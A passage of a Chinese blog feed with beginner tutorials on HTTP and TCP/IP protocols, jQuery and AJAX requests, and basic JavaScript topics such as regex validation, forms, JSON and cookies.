        <content type="html"><![CDATA[<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p>HTTP协议（HyperText Transfer Protocol，超文本传输协议）是因特网上应用最为广泛的一种网络传输协议，所有的WWW文件都必须遵守这个标准。</p><p>HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。</p><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>HTTP协议工作于客户端-服务端架构上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。</p><p>Web服务器有：Apache服务器，IIS服务器（Internet Information Services）等。</p><p>Web服务器根据接收到的请求后，向客户端发送响应信息。</p><p>HTTP默认端口号为80，但是你也可以改为8080或者其他端口。</p><h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><p>HTTP是无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。  </p><p>HTTP是媒体独立的：这意味着，只要客户端和服务器知道如何处理的数据内容，任何类型的数据都可以通过HTTP发送。客户端以及服务器指定使用适合的MIME-type内容类型。  </p><p>HTTP是无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</p><h4 id="消息结构"><a href="#消息结构" class="headerlink" title="消息结构"></a>消息结构</h4><p>HTTP是基于客户端/服务端（C/S）的架构模型，通过一个可靠的链接来交换信息，是一个无状态的请求/响应协议。</p><p>一个HTTP”客户端”是一个应用程序（Web浏览器或其他任何客户端），通过连接到服务器达到向服务器发送一个或多个HTTP的请求的目的。</p><p>一个HTTP”服务器”同样也是一个应用程序（通常是一个Web服务，如Apache Web服务器或IIS服务器等），通过接收客户端的请求并向客户端发送HTTP响应数据。</p><p>HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。</p><p>一旦建立连接后，数据消息就通过类似Internet邮件所使用的格式[RFC5322]和多用途Internet邮件扩展（MIME）[RFC2045]来传送。</p><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><p>根据 HTTP 标准，HTTP 请求可以使用多种请求方法。</p><p>HTTP1.0 定义了三种请求方法： GET, POST 和 HEAD方法。</p><p>HTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。</p><h4 id="常见异常状态码"><a href="#常见异常状态码" class="headerlink" title="常见异常状态码"></a>常见异常状态码</h4><pre><code>200 - 请求成功301 - 资源（网页等）被永久转移到其它URL404 - 请求的资源（网页等）不存在500 - 内部服务器错误</code></pre><h3 id="TCP-IP协议"><a href="#TCP-IP协议" class="headerlink" title="TCP/IP协议"></a>TCP/IP协议</h3><p>TCP/IP 是因特网的通信协议。</p><p>TCP/IP 通信协议是对计算机必须遵守的规则的描述，只有遵守这些规则，计算机之间才能进行通信。</p><h4 id="什么是-TCP-IP？"><a href="#什么是-TCP-IP？" class="headerlink" title="什么是 TCP/IP？"></a>什么是 TCP/IP？</h4><p>TCP/IP 是供已连接因特网的计算机进行通信的通信协议。</p><p>TCP/IP 指传输控制协议/网际协议（Transmission Control Protocol / Internet Protocol）。</p><p>TCP/IP 定义了电子设备（比如计算机）如何连入因特网，以及数据如何在它们之间传输的标准。</p><h4 id="内部协议"><a href="#内部协议" class="headerlink" title="内部协议"></a>内部协议</h4><p>在 TCP/IP 中包含一系列用于处理数据通信的协议：</p><p>TCP (传输控制协议) - 应用程序之间通信  </p><p>UDP (用户数据报协议) - 应用程序之间的简单通信  </p><p>IP (网际协议) - 计算机之间的通信<br>IP 是无连接的，用于计算机之间的通信。</p><p>IP 是无连接的通信协议。它不会占用两个正在通信的计算机之间的通信线路。这样，IP 就降低了对网络线路的需求。每条线可以同时满足许多不同的计算机之间的通信需要。</p><p>通过 IP，消息（或者其他数据）被分割为小的独立的包，并通过因特网在计算机之间传送。</p><p>IP 负责将每个包路由至它的目的地。  </p><p>ICMP (因特网消息控制协议) - 针对错误和状态  </p><p>DHCP (动态主机配置协议) - 针对动态寻址</p><h4 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h4><p>TCP/IP 使用 32 个比特或者 4 组 0 到 255 之间的数字来为计算机编址。</p><h4 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h4><p>每个计算机必须有一个 IP 地址才能够连入因特网。</p><p>每个 IP 包必须有一个地址才能够发送到另一台计算机。</p><p>在本教程下一节，您会学习到更多关于 IP 地址和 IP 名称的知识。<br>TCP/IP 使用 4 组数字来为计算机编址。每个计算机必须有一个唯一的 4 组数字的地址。</p><p>每组数字必须在 0 到 255 之间，并由点号隔开，比如：192.168.1.60。<br>TCP/IP 使用 32 个比特来编址。一个计算机字节是 8 比特。所以 TCP/IP 使用了 4 个字节。</p><p>一个计算机字节可以包含 256 个不同的值：</p><p>00000000、00000001、00000010、00000011、00000100、00000101、00000110、00000111、00001000 ……. 直到 11111111。</p><p>现在，您应该知道了为什么 TCP/IP 地址是介于 0 到 255 之间的 4 组数字。</p><h4 id="IPV6"><a href="#IPV6" class="headerlink" title="IPV6"></a>IPV6</h4><p>Pv6 是 “Internet Protocol Version 6” 的缩写，也被称作下一代互联网协议，它是由 IETF 小组（Internet 工程任务组Internet Engineering Task Force）设计的用来替代现行的 IPv4（现行的）协议的一种新的 IP 协议。</p><p>我们知道，Internet 的主机都有一个唯一的 IP 地址，IP 地址用一个 32 位二进制的数表示一个主机号码，但 32 位地址资源有限，已经不能满足用户的需求了，因此 Internet 研究组织发布新的主机标识方法，即 IPv6。</p><p>在 RFC1884 中（RFC 是 Request for Comments document 的缩写。RFC 实际上就是 Internet 有关服务的一些标准），规定的标准语法建议把 IPv6 地址的 128 位（16 个字节）写成 8 个 16 位的无符号整数，每个整数用 4 个十六进制位表示，这些数之间用冒号（:）分开，例如：</p><p>686E：8C64：FFFF：FFFF：0：1180：96A：FFFF</p><h3 id="常见协议"><a href="#常见协议" class="headerlink" title="常见协议"></a>常见协议</h3><pre><code>TCP/IP 协议TCP/IP 是不同的通信协议的大集合。协议族TCP/IP 是基于 TCP 和 IP 这两个最初的协议之上的不同的通信协议的大集合。TCP - 传输控制协议TCP 用于从应用程序到网络的数据传输控制。TCP 负责在数据传送之前将它们分割为 IP 包，然后在它们到达的时候将它们重组。IP - 网际协议（Internet Protocol）IP 负责计算机之间的通信。IP 负责在因特网上发送和接收数据包。HTTP - 超文本传输协议(Hyper Text Transfer Protocol)HTTP 负责 web 服务器与 web 浏览器之间的通信。HTTP 用于从 web 客户端（浏览器）向 web 服务器发送请求，并从 web 服务器向 web 客户端返回内容（网页）。HTTPS - 安全的 HTTP（HTTP Secure）HTTPS 负责在 web 服务器和 web 浏览器之间的安全通信。作为有代表性的应用，HTTPS 会用于处理信用卡交易和其他的敏感数据。SSL - 安全套接字层（Secure Sockets Layer）SSL 协议用于为安全数据传输加密数据。SMTP - 简易邮件传输协议（Simple Mail Transfer Protocol）SMTP 用于电子邮件的传输。MIME - 多用途因特网邮件扩展（Multi-purpose Internet Mail Extensions）MIME 协议使 SMTP 有能力通过 TCP/IP 网络传输多媒体文件，包括声音、视频和二进制数据。IMAP - 因特网消息访问协议（Internet Message Access Protocol）IMAP 用于存储和取回电子邮件。POP - 邮局协议（Post Office Protocol）POP 用于从电子邮件服务器向个人电脑下载电子邮件。FTP - 文件传输协议（File Transfer Protocol）FTP 负责计算机之间的文件传输。NTP - 网络时间协议（Network Time Protocol）NTP 用于在计算机之间同步时间（钟）。DHCP - 动态主机配置协议（Dynamic Host Configuration Protocol）DHCP 用于向网络中的计算机分配动态 IP 地址。SNMP - 简单网络管理协议（Simple Network Management Protocol）SNMP 用于计算机网络的管理。LDAP - 轻量级的目录访问协议（Lightweight Directory Access Protocol）LDAP 用于从因特网搜集关于用户和电子邮件地址的信息。ICMP - 因特网消息控制协议（Internet Control Message Protocol）ICMP 负责网络中的错误处理。ARP - 地址解析协议（Address Resolution Protocol）ARP - 用于通过 IP 来查找基于 IP 地址的计算机网卡的硬件地址。RARP - 反向地址转换协议（Reverse Address Resolution Protocol）RARP 用于通过 IP 查找基于硬件地址的计算机网卡的 IP 地址。BOOTP - 自举协议（Boot Protocol）BOOTP 用于从网络启动计算机。PPTP - 点对点隧道协议（Point to Point Tunneling Protocol）PPTP 用于私人网络之间的连接（隧道）。</code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络传输 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP/IP </tag>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jQuery的使用</title>
      <link href="/2019/09/02/web/html5/"/>
      <url>/2019/09/02/web/html5/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是jQuery？"><a href="#什么是jQuery？" class="headerlink" title="什么是jQuery？"></a>什么是jQuery？</h3><p>随着web2.0的兴起，JavaScript越来越受到重视，一些列JavaScript程序库也蓬勃发展起来。从早期的Prototype,Dojo到2006年的jQuery，再到2007年的ExtJS，互联网正在掀起一场JavaScript风暴。jQuery以其独特优雅的姿态，始终处于这场风暴的中心，受到越来越多的人的追捧。</p><p>jQuery，顾名思义，也就是JavaScript和查询（Query），即是辅助JavaScript开发的库。jQuery是继Prototype之后又一个优秀的JavaScript库，是一个由John Resig创建于2006年1月的开源项目。jQuery凭借简介的语法与跨平台的兼容性，极大地简化了JavaScript开发人员遍历HTML文档，操作DOM，处理事件，执行动画和开发Ajax的操作。其独特而又优雅的代码风格改变了JavaScript程序员的设计思路和编写程序的方式。总之，无论是网页设计师，后台开发者，业余爱好者还是项目管理者，也无论是JavaScript初学者还是JavaScript高手，都有足够多的理由去学习jQuery。</p><p>jQuery是一个JavaScript函数库。</p><p>jQuery是一个轻量级的”写的少，做的多”的JavaScript库。</p><p>jQuery库包含以下功能：</p><p>HTML 元素选取<br>HTML 元素操作<br>CSS 操作<br>HTML 事件函数<br>JavaScript 特效和动画<br>HTML DOM 遍历和修改<br>AJAX<br>Utilities<br>提示： 除此之外，Jquery还提供了大量的插件。<br>目前网络上有大量开源的 JS 框架, 但是 jQuery 是目前最流行的 JS 框架，而且提供了大量的扩展。</p><p>很多大公司都在使用 jQuery</p><p>如今开发，更多的是利用第三方框架，这些框架极大的缩短了开发周期，使软件开发更加高效。</p><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>）jQuery是一个兼容多浏览器的javascript库，核心理念是write less,do more(写得更少,做得更多)。</p><p>2）jQuery是免费、开源的，使用MIT许可协议。</p><p>3）jQuery的语法设计可以使开发更加便捷，例如操作文档对象、选择DOM元素、制作动画效果、事件处理、使用Ajax以及其他功能。</p><p>4）除此以外，jQuery提供API让开发者编写插件。其模块化的使用方式使开发者可以很轻松的开发出功能强大的静态或动态网页。 </p><h3 id="jQuery安装"><a href="#jQuery安装" class="headerlink" title="jQuery安装"></a>jQuery安装</h3><p><a href="https://jquery.com/download/" target="_blank" rel="noopener">jQuery官网</a></p><pre><code> jQuery的官方API文档地址是：http://api.jquery.com/</code></pre><p>下载比较特殊，你可以选择第一个精简版的下载，不要左键点击（会出现一堆乱码），右键选择将连接另存为到本地就可以下载下来了！下载到本地之后，将js文件引入到web项目当中就可以使用jQuery了！<br>当然也可以不下载官网的jQuery文件，使用URL的方式对jQuery进行响应式加载，例如：使用 Staticfile CDN、百度、又拍云、新浪、谷歌或微软的 jQuery，有一个很大的优势：<br>许多用户在访问其他站点时，已经从百度、又拍云、新浪、谷歌或微软加载过 jQuery。所以结果是，当他们访问您的站点时，会从缓存中加载 jQuery，这样可以减少加载时间。同时，大多数 CDN 都可以确保当用户向其请求文件时，会从离用户最近的服务器上返回响应，这样也可以提高加载速度。</p><h3 id="jQuery引入"><a href="#jQuery引入" class="headerlink" title="jQuery引入"></a>jQuery引入</h3><pre><code>&lt;script src=&quot;https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js&quot;&gt;&lt;/script&gt;</code></pre><p>这种方式可引入URL，也可以引入下载好的本地文件path。</p><h3 id="标识符含义"><a href="#标识符含义" class="headerlink" title="$标识符含义"></a>$标识符含义</h3><p>jQuery中$也只是一个普通的变量而已。</p><p>在此处函数$()接受一个字符串参数：</p><pre><code>    $(&#39;#parent&#39;)</code></pre><p>前面提到过，函数$()是完全支持querySelector()的功能的，也就是说$(‘#parent’)会去查找到DOM中id为parent的那个DOM对象，然后将其包装成为一个jQuery对象</p><p>将DOM对象包装成jQuery对象，我们已经见到两种了：</p><p>  1）第一种是直接将一个DOM对象作为参数传递给$()：</p><pre><code>    $(window)</code></pre><p>这样函数$()会将window对象包装成一个jQuery对象然后返回。</p><p>  2）第二种则是传递一个选择器的参数给$()：</p><pre><code>    $(&#39;#parent&#39;)</code></pre><p>这样函数$()首先会根据传入的字符串参数去DOM树中找到这个这一些对象，然后将其包装成jQuery对象。</p><p>在将普通的DOM对象包装成jQuery对象之后，这个jQuery对象就拥有了jQuery框架提供的众多的功能可以给我们使用了。也就是说jQuery通过变量$来暴露出一个对象，来为我们提供服务</p><h4 id="获取jQuery对象"><a href="#获取jQuery对象" class="headerlink" title="获取jQuery对象"></a>获取jQuery对象</h4><pre><code>$(window).load(function(){    var div = $(&quot;#parent&quot;);    var lis = $(&quot;.list&quot;);    var inps = $(&quot;input&quot;)});</code></pre><h4 id="DOM对象与jQuery对象之间的转换"><a href="#DOM对象与jQuery对象之间的转换" class="headerlink" title="DOM对象与jQuery对象之间的转换"></a>DOM对象与jQuery对象之间的转换</h4><p>  1）给构造函数$()传入一个选择器，然后它会找到这个选择器所匹配的DOM对象，并将其包装成jQuery对象：</p><pre><code>    $(&quot;#parent&quot;)</code></pre><p>  2）直接将一个DOM对象传递给$()，然后这个构造函数会将其包装成jQuery对象：</p><pre><code>    $(window)</code></pre><p># </p><pre><code>  var lis = $(&quot;.list&quot;);        var origDOM = [];         for(var i = 0; i &lt; lis.length; i++) {            origDOM[i] = lis[i];        }将jQuery当成一个数组读取，就能获取原始的DOM对象。</code></pre><h3 id="jQuery使用"><a href="#jQuery使用" class="headerlink" title="jQuery使用"></a>jQuery使用</h3><p>在使用纯JS编程的阶段，我们要查找节点可以有两种方式，一种是通过DOM标准提供的几个方法，例如getElementById、getElementsByTagName等；另一种则是CSS标准中提供的选择器的方法，如querySelector、querySelectorAll。</p><p>jQuery中的选择器兼容了CSS中的选择器，也就是说，可以像使用querySelector和querySelectorAll方法那样去使用jQuery选择器，除此之外，jQuery还对选择器进行了进一步的扩展，能够更方便的根据更精细的条件查找节点。</p><h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><pre><code>var parEl, trEls, listEls;$(window).load(function() {    // 获取 id 为 parent 的 div 元素    parEl = $(&#39;#parent&#39;);    // 获取所有 tr 标签元素    trEls = $(&#39;tr&#39;);    // 获取所有 class 为 list 的元素    listEls = $(&#39;.list&#39;);    //    console.log(parEl[0].tagName + &quot;+&quot; + trEls.length + &quot;+&quot; +listEls.length);}); </code></pre><h3 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h3><p>如果是前端AJAX目前是一项核心技术，如果是后端那也得会用，如果是全栈那更不用说了。</p><p>AJAX其实是几个单词的缩写，也就是异步的JavaScript和XML请求。</p><p>Ajax的核心是XMLHttpRequest对象，它是Ajax实现的关键——发送异步请求、接收响应及执行回调都是通过它来完成的。XMLHttpRequest对象最早是在Microsoft Internet Explorer 5.0 ActiveX组件中被引入的，之后各大浏览器厂商都以JavaScript内置对象的方式来实现XMLHttpRequest对象。虽然大家对它的实现方式有所区别，但是绝大多数浏览器都提供类似的属性和方法，而且在实际脚本编写方法上的区别也不大，实现得到的效果也基本相同。目前W3C组织正致力于制定一个各浏览器厂商可以统一遵照执行的XMLHttpRequest对象标准，用来推进Ajax技术的推广与发展。</p><h4 id="AJAX优点"><a href="#AJAX优点" class="headerlink" title="AJAX优点"></a>AJAX优点</h4><p>既然要学Ajax，那它的优势还是有必要了解一下的。</p><p>1、不需要插件支持</p><p>Ajax不需要任何浏览器插件，就可以被绝大多数主流浏览器所支持，用户只需要允许JavaScript在浏览器上执行即可。</p><p>2、优秀的用户体验</p><p>这是Ajax技术的最大优点，能在不刷新整个页面的前提下更新数据，这使得web应用程序能更为迅速地回应用户的操作。</p><p>3、提高web程序的性能</p><p>与传统模式相比，Ajax模式在性能上的最大区别就在于传输数据的方式，在传统模式中，数据提交是通过表单（Form）来实现的，而数据获取是靠全页面刷新来重新获取整页的内容。Ajax模式只是通过XMLHttpRequest对象向服务器端提交希望提交的数据，即按需发送。</p><p>4、减轻服务器和带宽的负担</p><p>Ajax的工作原理相当于在用户和服务器之间加了一个中间层，使用户操作与服务器响应异步化。它在客户端创建Ajax引擎，把传统方式下的一些服务器负担的工作转移到客户端，便于客户端资源来处理，减轻服务器和带宽的负担。</p><h4 id="原生js-AJAX使用"><a href="#原生js-AJAX使用" class="headerlink" title="原生js-AJAX使用"></a>原生js-AJAX使用</h4><pre><code>$(window).load(function() {    var xhr = new XMLHttpRequest();    var url = &quot;http://wthrcdn.etouch.cn/weather_mini?city=北京&quot;;    xhr.onreadystatechange = function() {        if (xhr.readyState == 4 &amp;&amp; xhr.status==200) {                $(&#39;body&#39;).text(xhr.responseText);                console.log(xhr.responseText);        }         else {          console.log(&quot;error&quot;);         }    };    xhr.open(&quot;get&quot;, url, true);    xhr.send(null);});</code></pre><p>AJAX功能通过浏览器提供的XMLHttpRequest对象实现，所以首先创建一个XMLHttpRequest对象。</p><pre><code>var xhr = new XMLHttpRequest();</code></pre><p>然后为xhr设置一个事件回调函数：</p><pre><code>xhr.onreadystatechange = function() {}</code></pre><p>我们之前说过使用AJAX来加载数据是异步的，也就是说，当我们的请求发送出去之后，会继续做别的事情，不会等待响应。那么等响应回来了由谁去处理呢？</p><p>因此，我们为这个响应事件设置一个回调函数，当响应回来之后，触发这个事件，然后就调用相应的函数来处理。</p><p>然后再设置这个xhr对象的请求方式，请求路径：</p><pre><code>xhr.open(&quot;get&quot;, url, true);</code></pre><p>然后最关键的一步是将构造好的这个请求，发送出去：</p><pre><code>xhr.send(null);</code></pre><p>然后看看这个onreadystatechange事件处理函数：当响应返回时，响应信息仍然在我们之前创建的这个xhr对象中，我们通过解析这个对象，来获取响应的相关信息。</p><p>在这个事件处理函数中，我们根据响应的状态码来判断响应是成功还是失败，如果成功则解析数据，进行后续处理，如果失败，则给出错误信息。</p><h4 id="jQuery下Ajax使用"><a href="#jQuery下Ajax使用" class="headerlink" title="jQuery下Ajax使用"></a>jQuery下Ajax使用</h4><pre><code>$(window).load(function() {    var aj = $.ajax( {          url: &#39;http://wthrcdn.etouch.cn/weather_mini?city=北京&#39;,          type:&#39;get&#39;,          dataType:&#39;json&#39;,          success:function(data) {            $(&#39;body&#39;).text(data);            console.log(data);        },          error : function() {                alert(&quot;异常！&quot;);           }      });});</code></pre><p><img src="http://img.ahdy.top/6367140817073399342412211.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> jQuery </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语法 </tag>
            
            <tag> jQuery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS进阶</title>
      <link href="/2019/09/02/web/html4/"/>
      <url>/2019/09/02/web/html4/</url>
      
        <content type="html"><![CDATA[<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h4 id="什么是正则表达式？"><a href="#什么是正则表达式？" class="headerlink" title="什么是正则表达式？"></a>什么是正则表达式？</h4><p>正则表达式是由一个字符序列形成的搜索模式。</p><p>当你在文本中搜索数据时，你可以用搜索模式来描述你要查询的内容。</p><p>正则表达式可以是一个简单的字符，或一个更复杂的模式。</p><p>正则表达式可用于所有文本搜索和文本替换的操作。  </p><pre><code>使用正则表达式搜索 &quot;Runoob&quot; 字符串，且不区分大小写：&lt;script type=&quot;text/javascript&quot;&gt;    var string =&quot;helloword!&quot;;    var i=string.search(&#39;h&#39;);    document.getElementById(&quot;1&quot;).innerHTML=i;&lt;/script&gt;/*是否带有小数*/  function    isDecimal(strValue )  {     var  objRegExp= /^\d+\.\d+$/;   return  objRegExp.test(strValue);  }  /*校验是否中文名称组成 */  function ischina(str) {    var reg=/^[\u4E00-\u9FA5]{2,4}$/;   /*定义验证表达式*/    return reg.test(str);     /*进行验证*/}/*校验是否全由8位数字组成 */  function isStudentNo(str) {    var reg=/^[0-9]{8}$/;   /*定义验证表达式*/    return reg.test(str);     /*进行验证*/}/*校验电话码格式 */  function isTelCode(str) {    var reg= /^((0\d{2,3}-\d{7,8})|(1[3584]\d{9}))$/;    return reg.test(str);}/*校验邮件地址是否合法 */  function IsEmail(str) {    var reg=/^\w+@[a-zA-Z0-9]{2,10}(?:\.[a-z]{2,4}){1,3}$/;    return reg.test(str);}</code></pre><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><pre><code>        对于后台开发人员来说，很重要的一个标签。        form 是一个表单，用于存放用户需要提交到后台进行处理的一些数据。        用户填写完后，提交到指定的action1. 检查输入内容是否为空&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;My frist javascript&lt;/title&gt;    &lt;style type=&quot;text/css&quot;&gt;        input{            padding: auto;            margin-top: 250px;            background-color: chartreuse;            text-align: center;            border: blue;        }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;form name=&quot;myfram&quot; action=&quot;&quot; onsubmit=&quot;return test()&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;text&quot; name=&quot;sum&quot; &gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;script type=&quot;text/javascript&quot;&gt;    function test () {       var x=document.forms[&quot;myfram&quot;][&quot;sum&quot;].value;        if (x==null || x==&quot;&quot;)        {            alert(&#39;请输入内容&#39;);            return false;        }        else {            alert(&#39;输入内容合法&#39;);            return true;        }    }&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;2. 检查输入内容是否是一个Email地址&lt;script&gt;function validateForm(){    var x=document.forms[&quot;myForm&quot;][&quot;email&quot;].value;    var atpos=x.indexOf(&quot;@&quot;);    var dotpos=x.lastIndexOf(&quot;.&quot;);    if (atpos&lt;1 || dotpos&lt;atpos+2 || dotpos+2&gt;=x.length){        alert(&quot;不是一个有效的 e-mail 地址&quot;);          return false;    }}&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form name=&quot;myForm&quot; action=&quot;demo-form.php&quot; onsubmit=&quot;return validateForm();&quot; method=&quot;post&quot;&gt;Email: &lt;input type=&quot;text&quot; name=&quot;email&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="标签元素值获取"><a href="#标签元素值获取" class="headerlink" title="标签元素值获取"></a>标签元素值获取</h3><pre><code>1. 通过id获取2. 通过标签名获取3. 通过类名获取&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;My frist javascript&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;88&quot;&gt;    &lt;p id=&quot;5&quot;&gt;&lt;/p&gt;    &lt;p id=&quot;8848&quot; class=&quot;c3p0&quot;&gt;今天是星期五！&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;&lt;!--  通过id获取元素值--&gt;var z=document.getElementById(&quot;8848&quot;).innerHTMLdocument.write(z)&lt;!--通过标签名获取元素值--&gt;    var x = document.getElementById(&quot;88&quot;);    var y = x.getElementsByTagName(&quot;p&quot;);    document.write(y[1].innerHTML);&lt;!--  通过类名获取元素的值--&gt;    var b=document.getElementsByClassName(&quot;c3p0&quot;);    //元素标签下标的使用其实是根据某一块级标签下相同元素个数使用的    //比如在一个div标签当中有多个p标签，那么当byclass获取到div值的时候就可以用下标的方式来显示你想输出第几个标签的内容    document.write(b[0].innerHTML);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="修图片的地址"><a href="#修图片的地址" class="headerlink" title="修图片的地址"></a>修图片的地址</h3><pre><code>&lt;img id=&quot;image&quot; src=&quot;smiley.gif&quot;&gt;&lt;script&gt;document.getElementById(&quot;image&quot;).src=&quot;landscape.jpg&quot;;&lt;/script&gt;</code></pre><h3 id="API验证输入"><a href="#API验证输入" class="headerlink" title="API验证输入"></a>API验证输入</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;请输入100~300之间的数据进行api验证！&lt;/p&gt;&lt;input type=&quot;number&quot; min=&quot;100&quot; max=&quot;300&quot; id=&quot;test&quot; required&gt;&lt;button onclick=&quot;f()&quot;&gt;验证&lt;/button&gt;&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;&lt;script type=&quot;text/javascript&quot;&gt;    function f() {        var x=document.getElementById(&quot;test&quot;);        if(x.checkValidity()==false)        {            document.getElementById(&quot;demo&quot;).innerHTML=x.validationMessage;        }        else        {            document.getElementById(&quot;demo&quot;).innerHTML=&quot;输入正确&quot;;        }    }&lt;/script&gt;/*&lt;script&gt;function myFunction() {var txt = &quot;&quot;;if (document.getElementById(&quot;id1&quot;).validity.rangeOverflow) {    txt = &quot;输入的值太大了&quot;;} else {    txt = &quot;输入正确&quot;;}document.getElementById(&quot;demo&quot;).innerHTML = txt;}&lt;/script&gt;&lt;script&gt;function myFunction() {var txt = &quot;&quot;;var inpObj = document.getElementById(&quot;id1&quot;);if(!isNumeric(inpObj.value)) {    txt = &quot;你输入的不是数字&quot;;} else if (inpObj.validity.rangeUnderflow) {    txt = &quot;输入的值太小了&quot;;} else {    txt = &quot;输入正确&quot;;}document.getElementById(&quot;demo&quot;).innerHTML = txt;}// 判断输入是否为数字function isNumeric(n) {return !isNaN(parseFloat(n)) &amp;&amp; isFinite(n);}&lt;/script&gt;*/&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="this"><a href="#this" class="headerlink" title="this"></a>this</h3><p>JavaScript this 关键字<br>面向对象语言中 this 表示当前对象的一个引用。</p><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><p>JSON 英文全称 JavaScript Object Notation<br>JSON 是一种轻量级的数据交换格式。<br>JSON是独立的语言 *<br>JSON 易于理解。  </p><pre><code>1. json数据转换为js对象&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;hello&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;为 JSON 字符串创建对象&lt;/h2&gt;&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;&lt;script&gt;var text = &#39;{ &quot;sites&quot; : [&#39; +    &#39;{ &quot;name&quot;:&quot;Runoob&quot; , &quot;url&quot;:&quot;www.runoob.com&quot; },&#39; +    &#39;{ &quot;name&quot;:&quot;Google&quot; , &quot;url&quot;:&quot;www.google.com&quot; },&#39; +    &#39;{ &quot;name&quot;:&quot;Taobao&quot; , &quot;url&quot;:&quot;www.taobao.com&quot; } ]}&#39;;obj = JSON.parse(text);document.getElementById(&quot;demo&quot;).innerHTML = obj.sites[1].name + &quot; &quot; + obj.sites[1].url;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="void"><a href="#void" class="headerlink" title="void"></a>void</h3><p>javascript:void(0) 中最关键的是 void 关键字， void 是 JavaScript 中非常重要的关键字，该操作符指定要计算一个表达式但是不返回值。<br>href=”#”与href=”javascript:void(0)”的区别</p><pre><code># 包含了一个位置信息，默认的锚是#top 也就是网页的上端。</code></pre><p>而javascript:void(0), 仅仅表示一个死链接。</p><p>在页面很长的时候会使用 # 来定位页面的具体位置，格式为：# + id。</p><p>如果你要定义一个死链接请使用 javascript:void(0)</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>在JS当中，函数存在构造函数，递归，函数是一个对象，也可以作为值来传递</p><h3 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h3><pre><code>先看一个简单的时间显示，该方法能显示出当前系统时间&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;在页面显示一个时钟&lt;/p&gt;&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;&lt;script&gt;var myVar=setInterval(function(){myTimer()},1000);function myTimer(){    var d=new Date();    var t=d.toLocaleTimeString();    document.getElementById(&quot;demo&quot;).innerHTML=t;}&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>Cookie 是一些数据, 存储于你电脑上的文本文件中。</p><p>当 web 服务器向浏览器发送 web 页面时，在连接关闭后，服务端不会记录用户的信息。</p><p>Cookie 的作用就是用于解决 “如何记录客户端的用户信息”:</p><p>当用户访问 web 页面时，他的名字可以记录在 cookie 中。<br>在用户下一次访问该页面时，可以在 cookie 中读取用户访问记录。<br>使用js可以对本地的cookie进行修改，也可以将一些数据写入到本地cookie当中！<br>JavaScript 可以使用 document.cookie 属性来创建 、读取、及删除 cookie</p><h3 id="弹窗"><a 